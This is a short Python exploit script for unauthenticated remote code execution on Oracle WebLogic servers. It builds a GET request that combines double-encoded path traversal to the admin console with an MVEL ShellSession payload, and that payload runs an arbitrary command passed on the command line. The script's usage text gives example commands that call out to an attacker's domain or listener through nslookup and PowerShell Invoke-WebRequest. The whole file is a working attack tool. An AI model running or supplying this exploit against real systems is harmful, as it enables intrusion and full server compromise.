#!/usr/bin/python3

import requests
import sys
from urllib3.exceptions import InsecureRequestWarning

# Check if the correct number of arguments are provided
if len(sys.argv) != 3:
    print("[+] WebLogic Unauthenticated RCE via GET request")
    print("[+] Usage: python3 exploit.py http(s)://target:7001 command")
    print("[+] Example 1: python3 exploit.py http(s)://target:7001 \"nslookup your_Domain\"")
    print("[+] Example 2: python3 exploit.py http(s)://target:7001 \"powershell.exe -c Invoke-WebRequest -Uri http://your_listener\"")
    sys.exit()

# Gather command line arguments
target = sys.argv[1]
command = sys.argv[2]

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# Initialize a session
session = requests.session()

# Set request headers
headers = {'Content-type': 'application/x-www-form-urlencoded; charset=utf-8'}

print("[+] Sending GET Request....")

# Craft the exploit URL
exploit_url = target + "/console/images/%252E%252E%252Fconsole.portal?_nfpb=false&_pageLable=&handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('" + command + "');\");"

# Make the GET request and capture the response
response = session.get(exploit_url, verify=False, headers=headers)

# Check if the request was successful
if response.status_code == 200:
    print("[+] Successfully sent the exploit.")
    print("[+] Response Code:", response.status_code)
    print("[+] Response Body:\n", response.text)
else:
    print("[-] Exploit failed. Response Code:", response.status_code)

print("[+] Done!!")
